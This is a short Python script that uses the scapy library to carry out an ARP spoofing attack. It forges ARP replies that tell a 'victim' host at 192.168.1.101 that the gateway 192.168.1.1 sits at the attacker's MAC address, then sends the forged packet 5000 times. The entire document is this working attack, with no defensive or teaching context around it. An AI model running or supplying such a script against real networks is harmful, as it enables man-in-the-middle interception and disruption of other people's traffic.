from scapy.all import *

pck=ARP()

#Target (victim of the attack)
pck.pdst="192.168.1.101"

#Attacker Mac Address
pck.hwsrc="00:15:5d:00:0a:05"

#Who usurped
pck.psrc="192.168.1.1"
pck.hwdst="00:15:5d:00:0a:07"

pck.inter=RandNum(10,40)
pck.loop=1

pck.show()

i=0
while i<5000:
    send(pck)
    i=i+1
